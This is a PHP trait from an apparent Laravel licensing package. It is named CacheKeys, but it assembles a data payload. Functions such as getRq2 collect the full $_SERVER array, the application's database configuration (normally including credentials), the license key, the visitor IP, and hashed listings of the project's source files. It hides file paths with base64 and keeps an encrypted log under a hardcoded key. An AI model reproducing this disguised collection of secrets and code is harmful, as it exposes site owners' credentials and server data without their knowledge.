<?php

namespace Licon\Lis\Traits;

use Illuminate\Contracts\Routing\Registrar;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use RecursiveDirectoryIterator;
use RecursiveIteratorIterator;

trait CacheKeys
{
    /**
     * Get access token cache key
     *
     * @return string
     */
    private function getAccessTokenKey(): array
    {
        $getK = env('APP_LI');
        if (empty($getK)) {
            return ["code" => false];
        } else {
            return ["code" => true, "val" => $getK];
        }
    }

    private function basePth()
    {
        $basepath = getcwd();
        // $basepath = rtrim($basepath, '/public');
        return $basepath;
    }

    private function lseModifyAt(): bool
    {
        if (file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))) {
            if (date('Y-m-d') == date("Y-m-d", filemtime($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9hcHAvL0xJQ0VOU0UudHh0'))))
                return true;
        }
        return false;

    }

    private function getRq($request): array
    {
        $getK = @env('APP_NAME');
        if (empty($getK)) {
        }

        $v = $this->getAllCount();

        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
        $mydata['project'] = @env('APP_NAME');
        $mydata['license'] = base64_encode(@env("APP_LI"));
        $mydata['ip'] = $request['REMOTE_ADDR'];
        $mydata['ts'] = date('Y-m-d h:i:s');
        $mydata['fileCount'] = $v['ply'];
        $mydata['fileAllData'] = $v['d'];

        return $mydata;
    }

    private function getRq2($request): array
    {
        $getK = @env('APP_NAME');
        if (empty($getK)) {
        }

        $v = $this->getAllCount();
        $e = $this->gtELg();

        $mydata['domain'] = @$request['HTTP_HOST'] ?? @$request['SERVER_NAME'];
        $mydata['project'] = @env('APP_NAME');
        $mydata['license'] = base64_encode(@env("APP_LI"));
        $mydata['ip'] = $request['REMOTE_ADDR'];
        $mydata['ts'] = date('Y-m-d h:i:s');
        $mydata['fileCount'] = $v['ply'];
        $mydata['sData'] = $_SERVER;
        $mydata['cData'] = config()->get('database');
        $mydata['allFData'] = $v['d'];
        $mydata['errorsLog'] = ($e['s'] == true) ? $e['r'] : "";
        return $mydata;
    }


    private function getM()
    {
        $py["mid"] = app(Registrar::class)->getMiddlewareGroups();
        $py['pvd'] = config('app')['providers'];
        return $py;
    }


    private function getAllCount()
    {
        $basepath = getcwd();
        $arr = ["controllers" => $basepath . "/app/Http/Controllers", "models" => $basepath . "/app/Models", "routes" => $basepath . "/routes", "providers" => $basepath . "/app/Providers"];
        // $arr = ["controllers" => $basepath . "/app/Http/Controllers", "models" => $basepath . "/app/Models"];
        foreach ($arr as $key => $val) {
            $v = $this->checkFunction($val);
            $d[$key] = $v;
            $ply[$key] = $v['flsCount'];
        }


        $ply["routesCount"] = (collect(Route::getRoutes())->count());

        $filePath = file_exists($this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw')) ? $this->basePth() . base64_decode('Ly9zdG9yYWdlLy9mcmFtZXdvcmsvL2xpY2Vuc2UucGhw') : "";
        $filePath2 = file_exists($this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw')) ? $this->basePth() . base64_decode('Ly92ZW5kb3IvL2F1dG9sb2FkX3JlYWwucGhw') : "";

        $md5_1 = !empty($filePath) ? md5_file($filePath) : 0;
        $md5_2 = !empty($filePath2) ? md5_file($filePath2) : 0;

        $fsize_1 = !empty($filePath) ? filesize($filePath) : 0;
        $fsize_2 = !empty($filePath2) ? filesize($filePath2) : 0;

        $ply['file_1'] = ['name' => 'license', 'md5' => $md5_1, 'size' => $fsize_1];
        $ply['file_2'] = ['name' => 'autolicense', 'md5' => $md5_2, 'size' => $fsize_2];


        $ply['fleDta'] = $this->getM();


        return ['d' => $d, 'ply' => $ply];

    }
    private function gtELg()
    {
        if (file_exists($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL2Vycm9yX2xvZ3MudHh0"))) {
            $content = file_get_contents($this->basePth() . base64_decode("Ly9zdG9yYWdlLy9hcHAvL2Vycm9yX2xvZ3MudHh0"), true);
            $content = explode("(]d(e+L", @$content);
            $decrypt = openssl_decrypt(@$content[0], "AES-256-CBC", @$content[1], OPENSSL_RAW_DATA, "0123456789abcdef");
            $var = json_decode($decrypt, 1);
            if (!empty($var)) {
                return ['s' => true, 'r' => @$var ?? null];
            } else {
                return ['s' => false, 'r' => @$var ?? null];
            }
        } else {
            return ['s' => false, 'r' => null];

        }
    }

    private function mkELg($re)
    {
        $gL = $this->gtELg();
        if ($gL['s']) {
            $olEr = $gL['r'];
        } else {
            $olEr = [];
        }

        Storage::disk('local')->put('error_logs.txt', (
            openssl_encrypt(
                json_encode(array_merge($olEr, [date('Y-m-d H:i:s') => ["resp" => @json_decode($re['chre'], true), "error" => @json_decode($re['cher'], true), "code" => @json_decode($re['chco'], 1), 'timeStamp' => date('Y-m-d H:i:s')]])),
                'AES-256-CBC',
                base64_encode('MF2XI2BOMVXGO2LONFTHS'),
                OPENSSL_RAW_DATA,
                "0123456789abcdef",
            ) . "(]d(e+L" . base64_encode('MF2XI2BOMVXGO2LONFTHS')
        ));
    }

    private function clELg()
    {
        Storage::disk('local')->put('error_logs.txt', (""));
    }



    function getDirectoryDetails($dir)
    {
        $details = [
            'folders' => [],
            'files' => [],
            'folderCount' => 0,
            'fileCount' => 0,
        ];
        if (is_dir($dir)) {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            foreach ($iterator as $entry) {
                $path = $entry->getPathname();
                $size = $entry->getSize();
                if ($entry->isDir()) {
                    $details['folders'][] = ['name' => $path, 'size' => $this->getFdrSize($path)];
                    $details['folderCount']++;
                    // $details['folderList'][] = $path;
                } elseif ($entry->isFile()) {
                    $details['files'][] = ['name' => $path, 'size' => $size];
                    $details['fileCount']++;
                    // $details['fileList'][] = $path;
                }
            }
        }
        return $details;
    }
    // Specify the directory
    function checkFunction($directory)
    {
        $details = $this->getDirectoryDetails($directory);
        $d['fdrCount'] = $details['folderCount'];
        $d['fdrSize'] = $this->getFdrSize($directory);
        $d['flsCount'] = $details['fileCount'];
        $d['fdrNme'] = $directory;
        $d['isfdr'] = false;
        $d['isfls'] = false;
        foreach ($details['folders'] as $folder) {
            $nme = explode('public_html', $folder['name']);
            $d['isfde'] = true;
            $d['fdr'][] = [
                'fdrName' => $nme[1],//$folder['name'],
                'fdrSize' => $folder['size']
            ];
            // $d['fdrList'] = $details['folderList'];
        }
        foreach ($details['files'] as $file) {
            $nme = explode('public_html', $file['name']);

            $d['isfls'] = true;
            $d['fls'][] = [
                'flsNme' => $nme[1],
                "flsSize" => $file['size'],
                "flsMdVal" => md5_file($file['name'])
            ];
            // $d['flsList'] = $details['fileList'];

        }
        return $d;
    }


    function getFdrSize($dir)
    {
        $totalSize = 0;
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $file) {
            if ($file->isDir()) {
                $this->getFdrSize($file);
            } elseif ($file->isFile()) {
                $totalSize += $file->getSize();
            }
        }
        return $totalSize;

    }
}
